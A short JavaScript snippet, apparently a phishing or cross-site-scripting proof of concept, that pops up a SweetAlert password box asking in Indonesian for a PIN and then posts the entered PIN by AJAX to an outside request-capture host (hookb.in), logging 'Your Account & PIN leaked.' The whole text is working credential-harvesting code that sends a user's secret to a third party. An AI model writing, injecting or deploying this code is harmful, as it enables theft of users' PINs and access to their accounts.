swal({
    title: 'Masukkan Pin:', 
    content: { 
        element: "input", 
        attributes: { type: "password", }, 
    }, 
}).then((result) => {
    $.ajax({
        type: "POST",
        url: "https://hookb.in/zrrbM8p2K1Uol3MMlzB2",
        data: JSON.stringify({
            "pin": result,
            "text" : "Your Account & PIN leaked."
        }),
        dataType: "json",
        contentType: "application/json; charset=utf-8",
        success: function (data) {
            console.log("Your Account & PIN leaked.");
        }
    });
});
